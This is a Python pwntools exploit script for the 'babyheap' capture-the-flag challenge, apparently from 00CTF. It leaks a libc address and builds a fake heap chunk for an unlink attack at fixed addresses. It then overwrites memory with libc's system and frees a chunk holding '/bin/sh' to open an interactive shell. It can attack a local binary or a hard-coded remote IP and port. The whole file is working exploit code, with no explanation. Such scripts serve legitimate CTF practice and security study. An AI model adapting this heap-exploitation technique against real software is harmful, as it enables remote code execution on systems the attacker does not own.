from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./babyheap_00ctf"
LIBC = "./libc-2.23.so_00ctf"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = 'debug'

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)
def recvmenu(conn):
    conn.recvuntil("6. exit\n")

def addn(conn, sz, s):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("size: \n")
    conn.sendline(str(sz))
    conn.recvuntil("username: \n")
    conn.send(s)

def edit(conn, n, idx, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("insecure edit\n")
    conn.sendline(str(n))
    conn.recvuntil("index: \n")
    conn.sendline(str(idx))
    conn.recvuntil("username: ")
    conn.send(s)

def free(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("index: \n")
    conn.sendline(str(idx))

def cname(conn, name):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil("name:\n")
    conn.sendline(name)

def exploit(conn, elf, libc, local):
    payload = ""
    payload += p64(0x60202c)
    payload += "A"*0x20
    conn.recvline()
    conn.send(payload)

    recvmenu(conn)
    conn.sendline("5")
    conn.recvline()
    libc.address = int(conn.recvline().rstrip()) - libc.symbols['read']
    log.info("%#x", libc.address)

    addn(conn, 264, "A"*264)
    addn(conn, 128, "A"*128)
    addn(conn, 128, "A"*128)
    addn(conn, 128, "/bin/sh")

    payload = ""
    payload += p64(0x00)
    payload += p64(0x101)
    payload += p64(0x602040 - 0x18)
    payload += p64(0x602040 - 0x10)
    payload += "\x00"*(0x100 - 0x20)
    payload += p64(0x100)
    payload += "\x90"
    edit(conn, 2, 0, payload)

    free(conn, 1)

    payload = ""
    payload += "A"*4
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(libc.address + 0x3c5c63)
    payload += p64(0x60202c)
    edit(conn, 1, 12, payload)

    edit(conn, 2, 12, "\x00"*4)

    edit(conn, 1, 0, "\x00"*0xb45 + p64(libc.symbols['system']) + "\n")
    free(conn, 3)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("159.203.116.12", 9999)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
